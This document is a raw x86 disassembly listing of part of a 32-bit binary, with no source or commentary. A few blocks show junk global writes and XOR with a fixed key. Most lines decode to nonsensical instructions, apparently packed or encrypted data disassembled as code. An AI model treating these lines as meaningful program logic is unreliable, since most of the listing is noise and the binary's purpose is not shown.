  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    ds:0x4c10d012,al
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	outs   dx,BYTE PTR ds:[esi]
  40a4a8:	jns    0x40a4c5
  40a4aa:	js     0x40a502
  40a4ac:	pop    ebp
  40a4ad:	pusha  
  40a4ae:	popa   
  40a4af:	int3   
  40a4b0:	mov    ecx,0xea7a4d97
  40a4b5:	dec    ebp
  40a4b6:	lods   al,BYTE PTR ds:[esi]
  40a4b7:	hlt    
  40a4b8:	mov    edi,0xe85a6c41
  40a4bd:	mov    gs,WORD PTR [ebp-0x596cdac6]
  40a4c3:	lahf   
  40a4c4:	dec    esp
  40a4c5:	out    0xb6,eax
  40a4c7:	ret    
  40a4c8:	inc    DWORD PTR [edi+eiz*8]
  40a4cb:	sti    
  40a4cc:	(bad)  
  40a4cd:	loope  0x40a548
  40a4cf:	ins    BYTE PTR es:[edi],dx
  40a4d0:	pop    ebx
  40a4d1:	bnd ret 0xd2f0
  40a4d5:	add    al,0xc5
  40a4d7:	push   0xd1198eac
  40a4dc:	sub    ebp,ebp
  40a4de:	inc    ebp
  40a4df:	pusha  
  40a4e0:	and    ecx,DWORD PTR ds:0xb777b7e6
  40a4e6:	xchg   edx,eax
  40a4e7:	and    eax,DWORD PTR [esp+0x6233bae8]
  40a4ee:	jmp    0x203e:0x5a9593ee
  40a4f5:	int    0xfc
  40a4f7:	push   edx
  40a4f8:	call   0x1159:0x147006e5
  40a4ff:	jb     0x40a4d6
  40a501:	fwait
  40a502:	loope  0x40a526
  40a504:	stos   BYTE PTR es:[edi],al
  40a505:	fwait
  40a506:	push   ds
  40a507:	mov    BYTE PTR [eiz*1+0x2a276b86],dh
  40a50e:	cli    
  40a50f:	cmp    BYTE PTR [esi+0x3f],al
  40a512:	mov    bl,0xc8
  40a514:	mov    DWORD PTR [eax+ecx*8-0x58683902],ebp
  40a51b:	jo     0x40a4f2
  40a51d:	jne    0x40a581
  40a51f:	fmul   DWORD PTR [ebx-0x71]
  40a522:	test   DWORD PTR fs:[eax-0x3],ecx
  40a526:	pop    ss
  40a527:	mov    bl,0x2e
  40a529:	mov    bh,0xce
  40a52b:	test   DWORD PTR [ecx],edx
  40a52d:	stos   DWORD PTR es:[edi],eax
  40a52e:	sub    DWORD PTR [edi],ebx
  40a530:	inc    ecx
  40a531:	out    0xf3,al
  40a533:	mov    edx,0xd3685cd6
  40a538:	sbb    BYTE PTR [edi-0x7a019df1],0x33
  40a53f:	push   0xe3347884
  40a544:	test   BYTE PTR [edi+0x5a253695],ah
  40a54a:	cdq    
  40a54b:	push   ss
  40a54c:	nop
  40a54d:	mov    bh,0x44
  40a54f:	jmp    0x41cf4751
  40a554:	and    al,0x2c
  40a556:	lods   eax,DWORD PTR ds:[esi]
  40a557:	fwait
  40a558:	inc    edx
  40a559:	fs ins DWORD PTR es:[edi],dx
  40a55b:	cld    
  40a55c:	mov    esp,0x8b24ab8c
  40a561:	rcl    edx,cl
  40a563:	xchg   ebp,ecx
  40a565:	xchg   dl,ah
  40a567:	jb     0x40a532
  40a569:	xchg   ecx,eax
  40a56a:	mov    ebx,0xdf45b82e
  40a56f:	or     BYTE PTR [esi+0x35],ah
  40a572:	adc    ecx,DWORD PTR [edi]
  40a574:	sbb    al,0x97
  40a576:	sbb    eax,0x69397ab1
  40a57b:	xchg   esp,eax
  40a57c:	retf   
  40a57d:	jbe    0x40a5fd
  40a57f:	dec    ebx
  40a580:	nop
  40a581:	out    0x67,eax
  40a583:	loope  0x40a529
  40a585:	(bad)  [esi+0x4]
  40a588:	add    al,0x4f
  40a58a:	in     eax,0x48
  40a58c:	(bad)  
  40a58d:	mov    bl,0x7f
  40a58f:	jmp    0x7a7c:0xd317f34a
  40a596:	(bad)  
  40a597:	dec    edx
  40a598:	xor    eax,0x1b830347
  40a59d:	shl    ecx,1
  40a59f:	mov    dl,0x37
  40a5a1:	bnd ret 0x349a
  40a5a5:	stos   BYTE PTR es:[edi],al
  40a5a6:	jnp    0x40a56c
  40a5a8:	(bad)  
  40a5a9:	cmp    ah,BYTE PTR [edi+edi*8+0x7d]
  40a5ad:	mov    bl,0x25
  40a5af:	lods   al,BYTE PTR ds:[esi]
  40a5b0:	and    ecx,edi
  40a5b2:	adc    ecx,DWORD PTR [edi-0x3e]
  40a5b5:	ds add eax,esp
  40a5b8:	inc    esp
  40a5b9:	(bad)  
  40a5ba:	push   ds
  40a5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5bc:	aad    0x25
  40a5be:	mov    bh,0xd1
  40a5c0:	lods   al,BYTE PTR ds:[esi]
  40a5c1:	mov    ecx,0x6fb99f3f
  40a5c6:	outs   dx,BYTE PTR ds:[esi]
  40a5c7:	test   edi,0x3d23e481
  40a5cd:	ins    DWORD PTR es:[edi],dx
  40a5ce:	xchg   DWORD PTR [esi+0x581fbf26],edx
  40a5d4:	xor    al,0x49
  40a5d6:	bound  ebp,QWORD PTR [ecx]
  40a5d8:	int    0xab
  40a5da:	mov    ch,ah
  40a5dc:	mov    bh,0xe3
  40a5de:	push   0x57
  40a5e0:	and    esp,DWORD PTR [esi-0x24]
  40a5e3:	xchg   ebx,eax
  40a5e4:	and    eax,0xea4cc77e
  40a5e9:	ror    bl,1
  40a5eb:	pop    edx
  40a5ec:	leave  
  40a5ed:	clc    
  40a5ee:	mov    al,ds:0x109e403c
  40a5f3:	pushf  
  40a5f4:	frstor [ebx-0x3f6034a7]
  40a5fa:	call   0xe53c:0x8a96e92
  40a601:	jge    0x40a58b
  40a603:	loop   0x40a637
  40a605:	mov    al,0x8f
  40a607:	mov    bh,0x23
  40a609:	pop    ebx
  40a60a:	int3   
  40a60b:	xor    BYTE PTR [eax+edi*2],cl
  40a60e:	jnp    0x40a602
  40a610:	push   es
  40a611:	inc    ebx
  40a612:	sub    ecx,esp
  40a614:	retf   
  40a615:	pop    eax
  40a616:	rol    dh,0x32
  40a619:	xchg   ebp,eax
  40a61a:	mov    bh,0x66
  40a61c:	mov    ecx,DWORD PTR [ecx+0x660073cb]
  40a622:	std    
  40a623:	hlt    
  40a624:	out    dx,al
  40a625:	lahf   
  40a626:	loope  0x40a695
  40a628:	and    BYTE PTR [ecx+edx*4-0x13],0x2d
  40a62d:	inc    eax
  40a62e:	(bad)
  40a631:	mov    bh,0xbf
  40a633:	inc    esi
  40a634:	clc    
  40a635:	mov    eax,ds:0xd7f61025
  40a63a:	cmp    bl,dl
  40a63c:	lahf   
  40a63d:	push   ss
  40a63e:	loope  0x40a5e9
  40a640:	stc    
  40a641:	dec    ebx
  40a642:	out    0xbc,al
  40a644:	dec    edi
  40a645:	in     eax,0x5d
  40a647:	shl    di,0x46
  40a64b:	sbb    al,0x82
  40a64d:	mov    cl,0x93
  40a64f:	mov    dl,0xe2
  40a651:	imul   edi,ecx,0xf472c1e8
  40a657:	adc    al,0x39
  40a659:	and    esp,DWORD PTR [edx+esi*8]
  40a65c:	fcomp  DWORD PTR [ebp+0x67]
  40a65f:	shr    DWORD PTR [ecx+0x4],cl
  40a662:	shl    DWORD PTR [ebx-0x3de53de0],cl
  40a668:	rcr    DWORD PTR [ebp-0x3f],0xb3
  40a66c:	in     al,dx
  40a66d:	loopne 0x40a65c
  40a66f:	xor    BYTE PTR [eax+0x49e660ce],ah
  40a675:	cli    
  40a676:	jl     0x40a6ea
  40a678:	dec    eax
  40a679:	jmp    FWORD PTR [ecx+0x7b0a1c09]
  40a67f:	push   ebp
  40a680:	sti    
  40a681:	and    bl,BYTE PTR [ecx+0x1f]
  40a684:	push   ebx
  40a685:	test   ebx,edx
  40a687:	sbb    DWORD PTR ds:0x95d5287c,ebx
  40a68d:	pushf  
  40a68e:	push   cs
  40a68f:	out    0x98,al
  40a691:	xchg   BYTE PTR [ebp+0x3237b9e],bh
  40a697:	pop    eax
  40a698:	push   ebp
  40a699:	retf   
  40a69a:	xor    eax,0xe8d41e21
  40a69f:	shr    DWORD PTR [ebp-0x2f],cl
  40a6a2:	xchg   edx,eax
  40a6a3:	sbb    DWORD PTR [ebx-0x7c],ebx
  40a6a6:	test   eax,esi
  40a6a8:	push   edx
  40a6a9:	jo     0x40a654
  40a6ab:	bound  ecx,QWORD PTR [edi-0x69fce55d]
  40a6b1:	repnz jecxz 0x40a65c
  40a6b4:	popf   
  40a6b5:	mov    BYTE PTR [eax],al
  40a6b7:	ror    DWORD PTR ds:0x3f8f666c,0x6a
  40a6be:	enter  0x9307,0x85
  40a6c2:	jp     0x40a6ea
  40a6c4:	sub    BYTE PTR [ecx-0x7cd58c5d],bl
  40a6ca:	adc    BYTE PTR [ebx-0x7bc21657],bl
  40a6d0:	xchg   ebx,eax
  40a6d1:	xor    BYTE PTR [ebp-0x1622b739],ah
  40a6d7:	aad    0x74
  40a6d9:	enter  0x9f05,0x68
  40a6dd:	js     0x40a6be
  40a6df:	pusha  
  40a6e0:	test   DWORD PTR [esi],esp
  40a6e2:	loopne 0x40a700
  40a6e4:	scas   eax,DWORD PTR es:[edi]
  40a6e5:	pop    es
  40a6e6:	test   al,0x5c
  40a6e8:	test   eax,0x79122b3a
  40a6ed:	cmp    edi,eax
  40a6ef:	mov    DWORD PTR ds:0x4337eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4337d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433867,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433897
  40a72f:	or     DWORD PTR ds:0x4338a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433893,0x433787
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43382f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4337e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43386f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43377f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43385b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43378b
  40a793:	sub    DWORD PTR ds:0x4337a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x3e1ec0c
  40a7ac:	mov    edi,0x7eed16fb
  40a7b1:	jle    0x40a7eb
  40a7b3:	jl     0x40a833
  40a7b5:	jle    0x40a774
  40a7b7:	out    0x63,eax
  40a7b9:	adc    DWORD PTR [esi-0x63],eax
  40a7bc:	fist   DWORD PTR [ebx]
  40a7be:	ror    dh,0xe
  40a7c1:	das    
  40a7c2:	push   ebp
  40a7c3:	out    dx,eax
  40a7c4:	dec    ebx
  40a7c5:	in     eax,0xf3
  40a7c7:	popa   
  40a7c8:	lods   eax,DWORD PTR ds:[esi]
  40a7c9:	mov    al,ds:0xd6a0cc58
  40a7ce:	sub    eax,0x568c24fd
  40a7d3:	popf   
  40a7d4:	mov    ecx,0xd622217d
  40a7d9:	push   0xb
  40a7db:	sub    al,0xae
  40a7dd:	mov    dh,0xff
  40a7df:	xor    al,bl
  40a7e1:	shl    BYTE PTR [eax+0xc6612c2],cl
  40a7e7:	fucom  st(2)
  40a7e9:	xchg   edx,eax
  40a7ea:	aaa    
  40a7eb:	xor    ebx,DWORD PTR ss:[ecx-0x3c]
  40a7ef:	and    sp,WORD PTR [edx]
  40a7f2:	arpl   cx,ax
  40a7f4:	xor    BYTE PTR [eax],ch
  40a7f6:	nop
  40a7f7:	inc    edx
  40a7f8:	cwde   
  40a7f9:	iret   
  40a7fa:	pop    ecx
  40a7fb:	mov    dh,BYTE PTR [esi+ebx*2]
  40a7fe:	push   es
  40a7ff:	dec    ebp
  40a800:	mov    edi,ecx
  40a802:	mov    ds:0xcc37f1b9,al
  40a807:	or     al,0x81
  40a809:	daa    
  40a80a:	inc    esp
  40a80b:	popa   
  40a80c:	pop    esp
  40a80d:	push   esp
  40a80e:	sub    BYTE PTR [edi],0x4
  40a811:	es scas al,BYTE PTR es:[edi]
  40a813:	ret    0xf57a
  40a816:	fwait
  40a817:	imul   ebx,DWORD PTR [edi],0xffffffb9
  40a81a:	aad    0xcd
  40a81c:	push   eax
  40a81d:	call   0x5d69fdf9
  40a822:	cdq    
  40a823:	gs cs retf 
  40a826:	scas   al,BYTE PTR es:[edi]
  40a827:	call   0x6e997402
  40a82c:	and    al,0xb3
  40a82e:	(bad)  
  40a82f:	and    edx,DWORD PTR [eiz*8+0x5f002989]
  40a836:	mov    ds:0x2dbbbc82,eax
  40a83b:	mov    ecx,0x1f882faa
  40a840:	adc    al,0x62
  40a842:	test   BYTE PTR [ebx+0xf9cbce7],dh
  40a848:	pop    ecx
  40a849:	jle    0x40a7f1
  40a84b:	mov    eax,0xd1da81ec
  40a850:	sbb    DWORD PTR [ebx-0x47],ebp
  40a853:	or     DWORD PTR [esi+0x39],ecx
  40a856:	pop    es
  40a857:	cmp    eax,DWORD PTR [edi-0x1b]
  40a85a:	loop   0x40a807
  40a85c:	and    bl,BYTE PTR [edi+0x78]
  40a85f:	pop    ss
  40a860:	mov    al,ds:0x883ab44c
  40a865:	push   es
  40a866:	push   ebp
  40a867:	pop    esi
  40a868:	mov    cl,0x3
  40a86a:	sub    al,0xb5
  40a86c:	popf   
  40a86d:	jl     0x40a8a5
  40a86f:	push   ebp
  40a870:	xchg   edx,eax
  40a871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a872:	cmc    
  40a873:	mov    BYTE PTR [ecx+0x64],bh
  40a876:	jne    0x40a8b1
  40a878:	xor    al,BYTE PTR [esi-0x7f]
  40a87b:	push   edx
  40a87c:	frstor es:[edx-0x45584e40]
  40a883:	sbb    eax,DWORD PTR [ebx+edi*1]
  40a886:	scas   eax,DWORD PTR es:[edi]
  40a887:	sub    dh,BYTE PTR [ebx-0x7cf93a2c]
  40a88d:	jle    0x40a8f7
  40a88f:	mov    WORD PTR [edi+0x5f],cs
  40a892:	cld    
  40a893:	xchg   ebp,eax
  40a894:	cmc    
  40a895:	sbb    BYTE PTR [ecx],bh
  40a897:	xor    ecx,ebp
  40a899:	adc    BYTE PTR [edi-0x1722f025],cl
  40a89f:	xchg   edi,eax
  40a8a0:	int3   
  40a8a1:	outs   dx,BYTE PTR ds:[esi]
  40a8a2:	mov    al,ds:0x8ba98791
  40a8a7:	(bad)  
  40a8a8:	mov    dl,0x10
  40a8aa:	inc    edx
  40a8ab:	pop    ds
  40a8ac:	rol    DWORD PTR [ecx],1
  40a8ae:	rcr    BYTE PTR [ecx-0x66],cl
  40a8b1:	mov    dl,0xbe
  40a8b3:	or     ebx,DWORD PTR [eax]
  40a8b5:	dec    edx
  40a8b6:	lock lods eax,DWORD PTR ds:[esi]
  40a8b8:	inc    esi
  40a8b9:	and    al,0xbb
  40a8bb:	outs   dx,BYTE PTR ds:[esi]
  40a8bc:	adc    eax,0xa781eee8
  40a8c1:	and    al,0x1e
  40a8c3:	mov    dl,0xd0
  40a8c5:	inc    ebp
  40a8c6:	ss stos DWORD PTR es:[edi],eax
  40a8c8:	xlat   BYTE PTR ds:[ebx]
  40a8c9:	enter  0xdf84,0xf2
  40a8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ce:	retf   
  40a8cf:	outs   dx,BYTE PTR ds:[esi]
  40a8d0:	jmp    FWORD PTR [ecx-0xac6f354]
  40a8d6:	das    
  40a8d7:	bound  eax,QWORD PTR [ecx]
  40a8d9:	arpl   WORD PTR [eax],bp
  40a8db:	xchg   BYTE PTR [edx+0x584223f6],dl
  40a8e1:	fwait
  40a8e2:	sub    al,0x5f
  40a8e4:	jp     0x40a8f6
  40a8e6:	ror    DWORD PTR ds:[edi],1
  40a8e9:	data16 loope 0x40a92d
  40a8ec:	sbb    bh,al
  40a8ee:	loope  0x40a8f1
  40a8f0:	call   FWORD PTR [ebx+0x4d319d91]
  40a8f6:	popa   
  40a8f7:	gs pop esi
  40a8f9:	dec    ebp
  40a8fa:	xchg   esp,eax
  40a8fb:	push   edi
  40a8fc:	loopne 0x40a8ec
  40a8fe:	add    eax,0x75b82665
  40a903:	fwait
  40a904:	inc    esp
  40a905:	sti    
  40a906:	arpl   WORD PTR [ebp-0x7dcf8c52],cx
  40a90c:	ins    BYTE PTR es:[edi],dx
  40a90d:	mov    esi,0x52f45398
  40a912:	int3   
  40a913:	and    edi,DWORD PTR [esi]
  40a915:	adc    ah,BYTE PTR [ebx]
  40a917:	or     bh,BYTE PTR [eax-0x4]
  40a91a:	push   0x5a
  40a91c:	dec    edx
  40a91d:	adc    esp,edx
  40a91f:	cmp    al,0x52
  40a921:	sbb    DWORD PTR [ebx],0xffffffbd
  40a924:	mov    eax,ds:0x2d73eead
  40a929:	test   al,dh
  40a92b:	xchg   ebp,eax
  40a92c:	mov    eax,ds:0x33243073
  40a931:	xchg   ebx,eax
  40a932:	addr16 mov eax,ds:0xdd58
  40a936:	xor    edi,DWORD PTR [esi+eiz*2-0x67]
  40a93a:	mov    edi,0xd6349b03
  40a93f:	add    al,0x76
  40a941:	xchg   ebx,esp
  40a943:	cli    
  40a944:	mov    es,WORD PTR [eax]
  40a946:	xchg   edx,eax
  40a947:	idiv   DWORD PTR [esi]
  40a949:	inc    eax
  40a94a:	dec    ebx
  40a94b:	(bad)  
  40a94c:	call   0x5d0d0f7c
  40a951:	cmp    eax,0x819bca18
  40a956:	xchg   edi,eax
  40a957:	retf   
  40a958:	pop    ss
  40a959:	pop    es
  40a95a:	jecxz  0x40a9d6
  40a95c:	int    0xf9
  40a95e:	sub    edi,DWORD PTR [ebx+0x15ef597a]
  40a964:	add    eax,0x689b61ee
  40a969:	bound  esp,QWORD PTR [esp+edx*2-0x70]
  40a96d:	xchg   DWORD PTR [ebx-0x19],esi
  40a970:	leave  
  40a971:	dec    edi
  40a972:	pop    ebp
  40a973:	(bad)  
  40a974:	mov    cl,0x80
  40a976:	cmp    DWORD PTR [edx-0x4a],0x67
  40a97a:	pop    edi
  40a97b:	pop    ss
  40a97c:	push   ebx
  40a97d:	push   0xffffffea
  40a97f:	push   edx
  40a980:	mov    ebx,0xc8ff5e08
  40a985:	jmp    0xa1fb:0x9399d187
  40a98c:	add    esp,ebx
  40a98e:	jnp    0x40a966
  40a990:	cmp    ebp,DWORD PTR [esi+0x766b5d8b]
  40a996:	xor    edx,edx
  40a998:	jp     0x40a98f
  40a99a:	sar    DWORD PTR [eax],cl
  40a99c:	aad    0x28
  40a99e:	(bad)  
  40a9a0:	clc    
  40a9a1:	sub    DWORD PTR [ebx-0x50e22dcf],0x2b1f8603
  40a9ab:	jmp    0x40a9e1
  40a9ad:	xlat   BYTE PTR ds:[ebx]
  40a9ae:	test   al,0xa4
  40a9b0:	cmp    BYTE PTR [edi+0x9],ah
  40a9b3:	(bad)  
  40a9b4:	loopne 0x40a9b0
  40a9b6:	lods   al,BYTE PTR ds:[esi]
  40a9b7:	inc    ebp
  40a9b8:	retf   
  40a9b9:	sbb    eax,0xbaa11c71
  40a9be:	nop
  40a9bf:	fnstsw WORD PTR [eax]
  40a9c1:	pop    ecx
  40a9c2:	adc    BYTE PTR [ebx],dl
  40a9c4:	rcr    DWORD PTR [ebp+0x7],1
  40a9c7:	adc    BYTE PTR [esi-0x70],bl
  40a9ca:	xchg   bh,ah
  40a9cc:	stos   BYTE PTR es:[edi],al
  40a9cd:	pop    eax
  40a9ce:	push   ecx
  40a9cf:	enter  0x8e3d,0x47
  40a9d3:	mov    bh,0x93
  40a9d5:	out    dx,al
  40a9d6:	daa    
  40a9d7:	xchg   ecx,eax
  40a9d8:	les    esi,FWORD PTR [ecx-0x4a]
  40a9db:	jmp    FWORD PTR [edx-0x38922331]
  40a9e1:	pop    ecx
  40a9e2:	xor    al,0x80
  40a9e4:	mov    dl,BYTE PTR [edx-0x62]
  40a9e7:	out    0x41,eax
  40a9e9:	and    cl,BYTE PTR [ebx+0x1b]
  40a9ec:	push   esp
  40a9ed:	adc    ecx,ecx
  40a9ef:	shl    esp,cl
  40a9f1:	not    DWORD PTR cs:[ecx+0x26]
  40a9f5:	fistp  DWORD PTR [esi+edx*4]
  40a9f8:	ret    
  40a9f9:	sti    
  40a9fa:	imul   edx,DWORD PTR [ecx-0x7413ba77],0x3d31fc45
  40aa04:	xchg   edi,eax
  40aa05:	aaa    
  40aa06:	inc    ebx
  40aa07:	add    BYTE PTR [ebx-0x39cc13b3],cl
  40aa0d:	adc    DWORD PTR ds:0x433897,0x433867
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4337e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	into   
  40aa35:	mov    eax,ds:0xebd0f59b
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	adc    eax,0xdc974382
  40aa45:	pushf  
  40aa46:	xchg   ebx,eax
  40aa47:	data16 cmp BYTE PTR [ecx-0x41],ah
  40aa4b:	pushf  
  40aa4c:	adc    bh,BYTE PTR [esi-0x59]
  40aa4f:	push   0x4dd6b96a
  40aa54:	or     BYTE PTR [esi+ebp*1+0x3c],0xf8
  40aa59:	imul   eax,edx,0xa2d38c9d
  40aa5f:	nop
  40aa60:	inc    edx
  40aa61:	retf   
  40aa62:	dec    edi
  40aa63:	ss pop edi
  40aa65:	bound  edi,QWORD PTR [esi]
  40aa67:	cmp    edi,DWORD PTR [ecx+0x52849d6d]
  40aa6d:	gs adc eax,0xf460dd8e
  40aa73:	popf   
  40aa74:	(bad)  
  40aa75:	cld    
  40aa76:	add    DWORD PTR [edx+0x6d5ab39f],0x16
  40aa7d:	jbe    0x40aa94
  40aa7f:	inc    ebp
  40aa80:	arpl   bp,si
  40aa82:	mov    esi,0x95ac3d92
  40aa87:	sub    dh,BYTE PTR [ecx+ebx*1-0x283e9556]
  40aa8e:	enter  0x6350,0x0
  40aa92:	lods   al,BYTE PTR ds:[esi]
  40aa93:	ss je  0x40aa9d
  40aa96:	cmp    al,0x62
  40aa98:	or     DWORD PTR [esi],ebp
  40aa9a:	pop    ss
  40aa9b:	mov    esi,0x48524374
  40aaa0:	pop    ecx
  40aaa1:	jae    0x40aaa5
  40aaa3:	clc    
  40aaa4:	or     edx,DWORD PTR [ecx+0x53]
  40aaa7:	jb     0x40aa52
  40aaa9:	icebp  
  40aaaa:	test   ecx,ecx
  40aaac:	shld   esp,ecx,cl
  40aaaf:	xor    al,0xb1
  40aab1:	jne    0x40aaca
  40aab3:	rol    BYTE PTR [ebx-0x33628444],1
  40aab9:	push   ecx
  40aaba:	cmp    ebx,ecx
  40aabc:	fstp   QWORD PTR [ecx-0x4ff35c95]
  40aac2:	pusha  
  40aac3:	es push edx
  40aac5:	pop    esp
  40aac6:	loopne 0x40aa9d
  40aac8:	(bad)  
  40aaca:	out    0x67,al
  40aacc:	(bad)  
  40aacd:	mov    al,0x32
  40aacf:	push   DWORD PTR [esi-0xeb3393f]
  40aad5:	xchg   edi,eax
  40aad6:	ror    BYTE PTR [eax],1
  40aad8:	and    BYTE PTR [edx-0x13dcf628],ch
  40aade:	jns    0x40aac9
  40aae0:	cli    
  40aae1:	test   BYTE PTR [edx-0x51],0x1e
  40aae5:	lock inc ebx
  40aae7:	xchg   ebx,eax
  40aae8:	xor    al,BYTE PTR [ecx+0x2770c294]
  40aaee:	jl     0x40aac7
  40aaf0:	das    
  40aaf1:	ja     0x40ab6b
  40aaf3:	shr    DWORD PTR [ecx+0x3807c5b6],0x8e
  40aafa:	ja     0x40aad0
  40aafc:	mov    ?,WORD PTR [eax-0x369f6c62]
  40ab02:	das    
  40ab03:	cdq    
  40ab04:	xchg   ebx,eax
  40ab05:	xor    DWORD PTR [ebp-0x43],edx
  40ab08:	pop    ds
  40ab09:	ror    BYTE PTR [ebx+0x7b],cl
  40ab0c:	push   ebx
  40ab0d:	rcl    edi,cl
  40ab0f:	cs in  eax,0x3a
  40ab12:	adc    eax,0xb6c1aa71
  40ab17:	sbb    ecx,esi
  40ab19:	retf   0x2d4a
  40ab1c:	dec    ecx
  40ab1d:	xchg   esi,eax
  40ab1e:	(bad)  
  40ab20:	mov    DWORD PTR [eax-0x5b],0xf8c85163
  40ab27:	add    cl,BYTE PTR [ebp+edx*2+0x44]
  40ab2b:	sub    eax,0xf15ad99c
  40ab30:	sti    
  40ab31:	jg     0x40aaf4
  40ab33:	cwde   
  40ab34:	or     bh,al
  40ab36:	sbb    ah,0x9c
  40ab39:	iret   
  40ab3a:	pop    edx
  40ab3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab3c:	ror    dh,0x1d
  40ab3f:	jg     0x40ab19
  40ab41:	mov    ecx,0xb7fb61ea
  40ab46:	inc    edx
  40ab47:	ret    0xe9e
  40ab4a:	cmp    BYTE PTR [edx+0x11811593],0xe9
  40ab51:	jp     0x40ab5e
  40ab53:	cmp    esi,ecx
  40ab55:	repz jb 0x40ab9e
  40ab58:	jo     0x40aaee
  40ab5a:	adc    al,0x8c
  40ab5c:	dec    esi
  40ab5d:	inc    eax
  40ab5e:	je     0x40ab11
  40ab60:	push   edi
  40ab61:	xchg   dl,ah
  40ab63:	ss inc edi
  40ab65:	fwait
  40ab66:	iret   
  40ab67:	xor    edx,DWORD PTR ss:[ebx]
  40ab6a:	fistp  QWORD PTR [eax+0x5ed38306]
  40ab70:	mov    al,BYTE PTR [ecx-0x702e180]
  40ab76:	in     al,0xe5
  40ab78:	retf   0xddab
  40ab7b:	outs   dx,DWORD PTR ds:[esi]
  40ab7c:	popf   
  40ab7d:	in     al,dx
  40ab7e:	test   dl,bl
  40ab80:	jmp    0xe69d31f1
  40ab85:	scas   eax,DWORD PTR es:[edi]
  40ab86:	mov    dh,0x4f
  40ab88:	mov    ds:0x1edeb044,al
  40ab8d:	hlt    
  40ab8e:	xchg   esi,eax
  40ab8f:	in     al,0xcf
  40ab91:	push   cs
  40ab92:	or     DWORD PTR [eax-0x5d12f4c],0x551368ac
  40ab9c:	push   0x961c2cfd
  40aba1:	xor    dh,BYTE PTR [ebx+0x2f]
  40aba4:	inc    eax
  40aba5:	push   ebx
  40aba6:	dec    esi
  40aba7:	dec    eax
  40aba8:	adc    dl,BYTE PTR [esi+0x70]
  40abab:	out    0x2d,eax
  40abad:	daa    
  40abae:	and    DWORD PTR [ebp+0x71],edx
  40abb1:	add    BYTE PTR ds:0xae6e1737,al
  40abb7:	aaa    
  40abb8:	xor    cl,BYTE PTR [edx-0x4213b70]
  40abbe:	add    BYTE PTR [edx-0x6d98af36],bh
  40abc4:	jbe    0x40ab7a
  40abc6:	inc    edi
  40abc7:	mov    dh,0x9b
  40abc9:	mov    ds:0xb4b920ec,al
  40abce:	and    ebp,DWORD PTR [eax-0x73]
  40abd1:	loopne 0x40ab64
  40abd3:	outs   dx,DWORD PTR ds:[esi]
  40abd4:	pop    edx
  40abd5:	mov    DWORD PTR [edi],ebx
  40abd7:	push   ds
  40abd8:	mov    bl,0x79
  40abda:	das    
  40abdb:	dec    ecx
  40abdc:	out    0x71,al
  40abde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abdf:	ja     0x40ab85
  40abe1:	sub    BYTE PTR [ecx+0x7e],al
  40abe4:	xor    BYTE PTR [ecx+0x6cad19ca],bl
  40abea:	fs add dh,al
  40abed:	cld    
  40abee:	fisubr DWORD PTR [eax-0x3d77267e]
  40abf4:	mov    ebx,0xcc3b5f59
  40abf9:	xor    DWORD PTR [esi+ecx*1+0x51],ebp
  40abfd:	mov    cs,WORD PTR [esi]
  40abff:	xchg   esp,eax
  40ac00:	outs   dx,DWORD PTR ds:[esi]
  40ac01:	xchg   esi,eax
  40ac02:	jb     0x40ac75
  40ac04:	test   BYTE PTR [ebx],bh
  40ac06:	pop    esi
  40ac07:	icebp  
  40ac08:	sbb    eax,0xf709a47d
  40ac0d:	cs push edi
  40ac0f:	mov    ebx,DWORD PTR [ebx-0x2e]
